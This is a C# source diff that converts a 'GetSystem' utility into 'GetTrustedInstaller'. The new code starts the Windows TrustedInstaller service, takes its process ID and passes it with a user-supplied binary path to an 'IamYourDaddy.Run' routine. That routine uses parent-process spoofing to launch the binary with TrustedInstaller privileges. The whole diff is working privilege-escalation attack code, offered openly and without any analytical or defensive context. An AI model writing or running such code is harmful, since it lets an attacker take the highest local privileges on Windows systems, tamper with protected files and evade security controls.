@@ -1,6 +1,7 @@
 ﻿using System.Diagnostics;
+using System.ServiceProcess;
 
-namespace GetSystem
+namespace GetTrustedInstaller
 {
     class Program
     {
@@ -8,12 +9,16 @@ namespace GetSystem
         
         static void Main(string[] args)
         {
-            string binaryPath = args[0];
-            string ProcessToSpoof = args[1];
-            int parentProcessId;
-            Process[] explorerproc = Process.GetProcessesByName(ProcessToSpoof);
-            parentProcessId = explorerproc[0].Id;
-            IamYourDaddy.Run(parentProcessId, binaryPath);
+
+            // I use TrustedInstaller process that is in the background only when the TrustedInstaller service is running to pass its ID to py7hagoras code
+            ServiceController sc = new ServiceController
+            {
+                ServiceName = "TrustedInstaller",
+            };
+            if (sc.Status != ServiceControllerStatus.Running)
+            sc.Start();
+            Process[] proc = Process.GetProcessesByName("TrustedInstaller");
+            IamYourDaddy.Run(proc[0].Id, args[0]);
            
         }
 
